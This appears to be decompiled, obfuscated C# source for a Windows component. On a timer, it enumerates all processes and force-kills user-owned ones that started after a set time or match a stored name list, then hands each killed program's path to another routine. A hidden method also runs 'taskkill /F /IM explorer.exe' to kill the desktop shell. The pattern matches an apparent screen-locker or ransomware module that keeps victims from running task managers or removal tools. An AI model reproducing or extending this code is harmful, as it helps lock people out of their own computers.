using System;
using System.Diagnostics;
using System.Timers;

internal sealed class Class9
{
	private double double_0;

	private DateTime dateTime_0;

	private Timer timer_0;

	public Class9()
	{
		DateTime dateTime = DateTime.Now.AddSeconds(Class6.int_3);
		dateTime_0 = new DateTime(dateTime.Year, dateTime.Month, dateTime.Day, dateTime.Hour, dateTime.Minute, dateTime.Second, dateTime.Millisecond);
		double_0 = Class6.double_0;
	}

	public void method_0()
	{
		timer_0 = new Timer();
		timer_0.Elapsed += timer_0_Elapsed;
		timer_0.AutoReset = true;
		timer_0.Enabled = true;
		timer_0.Start();
	}

	public void method_1()
	{
		if (timer_0 != null)
		{
			timer_0.Enabled = false;
			timer_0.Stop();
		}
	}

	private void timer_0_Elapsed(object sender, ElapsedEventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process_ in array)
		{
			method_2(process_);
		}
	}

	private void method_2(Process process_0)
	{
		string text = Class15.smethod_1(process_0.Id);
		try
		{
			if (process_0 == null || !(text != "NT AUTHORITY\\SYSTEM") || !(text != "NT AUTHORITY\\LOCAL SERVICE") || !(text != "NO OWNER") || (!(Class15.smethod_2(process_0) > dateTime_0) && !smethod_0(process_0)))
			{
				return;
			}
			try
			{
				string empty = string.Empty;
				try
				{
					empty = process_0.MainModule!.FileName;
				}
				catch
				{
					empty = process_0.ProcessName;
				}
				process_0.Kill();
				GClass3.smethod_3(empty);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private static bool smethod_0(Process process_0)
	{
		string processName = process_0.ProcessName;
		string[] string_ = Class6.string_6;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string text = string_[num];
				if (text == processName)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void smethod_1()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("taskkill", "/F /IM explorer.exe");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}
}
